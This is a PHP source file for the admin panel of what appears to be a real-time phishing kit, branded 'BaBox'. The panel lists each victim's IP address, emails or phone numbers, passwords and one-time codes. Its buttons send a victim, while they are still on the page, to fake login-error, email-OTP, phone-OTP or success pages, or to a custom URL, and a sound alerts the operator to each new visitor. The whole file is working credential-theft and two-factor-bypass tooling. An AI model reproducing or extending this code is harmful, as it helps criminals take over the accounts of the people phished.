<?php
session_start();

if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header("Location: login.php");
    exit;
}

$sound_flag_file = 'newvisitor.flag';
$json_log_file = 'visitors.json';
$redirect_dir = 'redirects';

// Clear all visitors
if (isset($_GET['action']) && $_GET['action'] === 'clear_visitors') {
    if (file_exists($json_log_file)) unlink($json_log_file);
    foreach (glob("$redirect_dir/*.txt") as $file) unlink($file);
    header("Location: admin.php");
    exit;
}

// Delete single visitor
if (isset($_GET['action']) && $_GET['action'] === 'delete_visitor' && isset($_GET['visitor_id'])) {
    $visitor_id = $_GET['visitor_id'];

    // Remove from visitors.json
    if (file_exists($json_log_file)) {
        $logs = json_decode(file_get_contents($json_log_file), true);
        if (is_array($logs)) {
            $logs = array_filter($logs, function($v) use ($visitor_id) {
                return $v['visitor_id'] !== $visitor_id;
            });
            file_put_contents($json_log_file, json_encode(array_values($logs)));
        }
    }

    // Remove redirect file
    $redirect_file = "$redirect_dir/$visitor_id.txt";
    if (file_exists($redirect_file)) {
        unlink($redirect_file);
    }

    header("Location: admin.php");
    exit;
}

if (file_exists($sound_flag_file)) unlink($sound_flag_file);

$logs = file_exists($json_log_file) ? json_decode(file_get_contents($json_log_file), true) : [];
if (!is_array($logs)) $logs = [];

$grouped_visitors = [];
foreach ($logs as $visitor) {
    $grouped_visitors[$visitor['visitor_id']] = $visitor;
}

usort($grouped_visitors, function($a, $b) {
    $a_latest = end($a['logs'])['timestamp'] ?? '';
    $b_latest = end($b['logs'])['timestamp'] ?? '';
    return strcmp($b_latest, $a_latest);
});

if (isset($_GET['search']) && $_GET['search'] !== '') {
    $query = strtolower(trim($_GET['search']));
    $grouped_visitors = array_filter($grouped_visitors, function($v) use ($query) {
        return strpos(strtolower($v['visitor_id']), $query) !== false;
    });
}

if ((isset($_GET['redirect']) && isset($_GET['visitor_id'])) || (isset($_GET['custom_redirect'], $_GET['visitor_id'], $_GET['url']))) {
    $visitor_id = $_GET['visitor_id'];

    if (isset($_GET['custom_redirect'])) {
        $custom_url = trim($_GET['url']);
        if ($custom_url !== '') {
            if (!is_dir($redirect_dir)) mkdir($redirect_dir, 0777, true);
            file_put_contents("$redirect_dir/$visitor_id.txt", $custom_url);
        }
    } else {
        $urls = [
            'A1' => 'Login error.html',
            'A2' => 'Auth-e.html',
            'A3' => 'Auth-p.html',
            'A4' => 'Success.html',
        ];
        $target = $_GET['redirect'];
        if (isset($urls[$target])) {
            if (!is_dir($redirect_dir)) mkdir($redirect_dir, 0777, true);
            file_put_contents("$redirect_dir/$visitor_id.txt", $urls[$target]);
        }
    }
    header("Location: admin.php");
    exit;
}

function getRedirectStatus($id) {
    $file = "redirects/$id.txt";
    return file_exists($file) ? file_get_contents($file) : 'Waiting';
}

function countTotalVisitors($visitors) {
    return count($visitors);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Admin Panel</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f4f6f9;
      color: #222;
      display: flex;
      height: 100vh;
      overflow: hidden;
    }
    .sidebar {
      width: 260px;
      background: #2c3e50;
      color: #ecf0f1;
      padding: 20px;
      display: flex;
      flex-direction: column;
    }
    .sidebar h1 {
      font-size: 20px;
      margin-bottom: 20px;
      text-align: center;
    }
    .btn, .search-input {
      padding: 10px;
      margin-bottom: 10px;
      border-radius: 6px;
      border: none;
      width: 100%;
      font-weight: bold;
    }
    .btn {
      background: #3498db;
      color: white;
      cursor: pointer;
    }
    .btn:hover { background: #2980b9; }
    .search-input {
      background: #fff;
      color: #000;
      border: 1px solid #ddd;
    }
    .content {
      flex: 1;
      overflow-y: auto;
      padding: 20px;
      background: #ecf0f1;
    }
    .visitor-card {
      background: #fff;
      border: 1px solid #ddd;
      margin-bottom: 20px;
      padding: 15px;
      border-radius: 8px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    .visitor-header {
      font-weight: bold;
      cursor: pointer;
      margin-bottom: 8px;
      font-size: 16px;
      color: #2c3e50;
    }
    .visitor-body { display: none; }
    .visitor-card.active .visitor-body { display: block; }
    .status-pill {
      display: inline-block;
      padding: 3px 10px;
      border-radius: 12px;
      font-size: 13px;
      font-weight: bold;
    }
    .waiting { background: #f39c12; color: white; }
    .set { background: #27ae60; color: white; }
    .info { font-size: 14px; margin: 4px 0; }
    .visitor-actions button {
      margin: 5px 5px 0 0;
      padding: 8px 14px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      background: #3498db;
      color: white;
      font-weight: bold;
    }
    .visitor-actions button:hover { background: #2980b9; }
    .delete-btn { background: #e74c3c !important; }
    .delete-btn:hover { background: #c0392b !important; }
    .copy-btn { background: #16a085 !important; }
    .copy-btn:hover { background: #138d75 !important; }
  </style>
</head>
<body>
  <div class="sidebar">
    <h1>BaBox Admin Dashboard</h1>
    <form method="GET">
      <input class="search-input" type="text" name="search" placeholder="Search ID" value="<?= isset($_GET['search']) ? htmlspecialchars($_GET['search']) : '' ?>">
      <button class="btn" type="submit">Search</button>
    </form>
    <button class="btn" onclick="if(confirm('Clear logs?')) window.location='?action=clear_visitors'">Clear Logs</button>
    <a href="all_visitors.php" target="_blank"><button class="btn">All Logs</button></a>
    <a href="logout.php"><button class="btn">Logout</button></a>
    <button class="btn" id="pauseBtn" onclick="toggleRefresh()">Pause</button>
    <div style="margin-top:15px;">👥 Total Visitors: <?= countTotalVisitors($grouped_visitors) ?></div>
  </div>

  <div class="content" id="visitor-section">
    <?php if (empty($grouped_visitors)): ?>
      <p>No visitors yet.</p>
    <?php else:
      $num = 1;
      foreach ($grouped_visitors as $v): 
        $emails = implode(", ", array_unique(array_filter(array_column($v['logs'], 'email_or_phone'))));
        $passwords = implode(", ", array_unique(array_filter(array_column($v['logs'], 'password'))));
        $otps = implode(", ", array_unique(array_filter(array_column($v['logs'], 'otp'))));
        $pages = implode(", ", array_unique(array_filter(array_column($v['logs'], 'page'))));
        $timestamps = implode(", ", array_unique(array_filter(array_column($v['logs'], 'timestamp'))));
      ?>
      <div class="visitor-card" onclick="this.classList.toggle('active')">
        <div class="visitor-header">#<?= $num++ ?> - ID: <?= htmlspecialchars($v['visitor_id']) ?></div>
        <div class="visitor-body">
          <div class="info">IP: <?= htmlspecialchars($v['ip']) ?></div>
          <div class="info">Status: 
            <span class="status-pill <?= getRedirectStatus($v['visitor_id']) === 'Waiting' ? 'waiting' : 'set' ?>">
              <?= htmlspecialchars(getRedirectStatus($v['visitor_id'])) ?>
            </span>
          </div>
          <div class="info">Email(s): <?= htmlspecialchars($emails) ?></div>
          <div class="info">Password(s): <?= htmlspecialchars($passwords) ?></div>
          <div class="info">OTP(s): <?= htmlspecialchars($otps) ?></div>
          <div class="info">Page(s): <?= htmlspecialchars($pages) ?></div>
          <div class="info">Timestamps: <?= htmlspecialchars($timestamps) ?></div>

          <div class="visitor-actions">
            <button class="copy-btn" onclick="copyLog(event, `Visitor ID: <?= $v['visitor_id'] ?>\nIP: <?= $v['ip'] ?>\nEmails: <?= $emails ?>\nPasswords: <?= $passwords ?>\nOTPs: <?= $otps ?>\nPages: <?= $pages ?>\nTimestamps: <?= $timestamps ?>`)">Copy Log</button>

            <a href="?redirect=A1&visitor_id=<?= urlencode($v['visitor_id']) ?>"><button>Login Error</button></a>
            <a href="?redirect=A2&visitor_id=<?= urlencode($v['visitor_id']) ?>"><button>Email OTP</button></a>
            <a href="?redirect=A3&visitor_id=<?= urlencode($v['visitor_id']) ?>"><button>Phone OTP</button></a>
            <a href="?redirect=A4&visitor_id=<?= urlencode($v['visitor_id']) ?>"><button>End</button></a>

            <form action="admin.php" method="GET" style="margin-top:8px;">
              <input type="hidden" name="custom_redirect" value="1" />
              <input type="hidden" name="visitor_id" value="<?= htmlspecialchars($v['visitor_id']) ?>" />
              <input type="url" name="url" placeholder="Custom redirect URL" required style="width:200px;padding:5px;" />
              <button type="submit">Go</button>
            </form>

            <a href="?action=delete_visitor&visitor_id=<?= urlencode($v['visitor_id']) ?>" 
               onclick="return confirm('Are you sure you want to delete this visitor?')">
               <button class="delete-btn">Delete Visitor</button>
            </a>
          </div>
        </div>
      </div>
    <?php endforeach; endif; ?>
  </div>

  <audio id="notifySound" src="notify.mp3" preload="auto"></audio>
  <script>
    let seconds = 10;
    let paused = false;
    const countdownEl = document.createElement('div');
    countdownEl.style = 'position:fixed;bottom:15px;left:20px;color:#2c3e50;font-size:14px;font-weight:bold';
    document.body.appendChild(countdownEl);

    function updateCountdown() {
      if (!paused) {
        seconds--;
        if (seconds <= 0) location.reload();
      }
      countdownEl.innerHTML = `⏳ Refreshing in ${seconds}s`;
    }
    setInterval(updateCountdown, 1000);

    function toggleRefresh() {
      paused = !paused;
      document.getElementById("pauseBtn").innerText = paused ? "Resume" : "Pause";
      if (!paused) seconds = 10;
    }

    async function checkNewVisitor() {
      try {
        const res = await fetch("check_newvisitor.php");
        const data = await res.json();
        if (data.newVisitor) {
          document.getElementById('notifySound').play().catch(() => {});
        }
      } catch (e) { console.error(e); }
    }
    setInterval(checkNewVisitor, 3000);

    document.querySelectorAll('.visitor-body form, .visitor-body form *').forEach(el => {
      el.addEventListener('click', e => e.stopPropagation());
    });

    function copyLog(e, text) {
      e.stopPropagation();
      navigator.clipboard.writeText(text).then(() => {
        alert("Log copied to clipboard!");
      });
    }
  </script>
</body>
</html>
